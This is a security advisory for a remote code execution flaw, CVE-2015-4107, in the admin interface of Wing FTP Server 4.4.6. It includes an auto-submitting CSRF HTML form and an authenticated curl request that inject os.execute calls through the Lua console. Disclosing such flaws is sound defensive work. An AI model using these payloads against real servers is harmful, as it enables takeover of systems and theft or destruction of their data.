Advisory Details:


(1) Vendor & Product Description
--------------------------------
Vendor:Wing FTP software


Product & Version:
Wing FTP Server v 4.4.6

Vendor URL & Download:
http://www.wftpserver.com/

You can also monitor server performance and online sessions and even receive email notifications about various events taking place on the server."


(2) Vulnerability Details:
--------------------------
The admin interface of Wing FTP Server is vulnerable to a Remote Code Execution (RCE) vulnerability. 

Proof of concept for RCE [CVE-2015-4107]:
-----------------------------------------

The RCE can be exploited in two scenarios, either by a CSRF attack (the admin interface is vulnerable to CSRF attacks) or by being authenticated to the admin interface. The attack leverages the LUA CLI to inject commands at the same privilege as the web server.

The RCE via CSRF POC

<html>
  <body>
    <form action="http://<server address>:5466/admin_lua_script.html" method="POST" enctype="text/plain">
      <input type="hidden" name="command" value="os.execute('<any OS command here>')" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

RCE via authenticated administrator

1) Either utilising the LUA Console interface directly and using the os.execute('<OS command here>') method.
2) POST directly using CURL with an authenticated cookie:
curl -i -s -k  -X 'POST' -b 'admin_lang=english; UIDADMIN=b8b208e2239f462c11641eaa10cde7b0' --data-binary $'command=os.execute(\'cmd.exe\')'
'http://<server address>:5466/admin_lua_script.html'

Parameter names: "command"
Parameter Type: POST
Attack Pattern:
Any OS command can be inserted into the os.execute('') method.
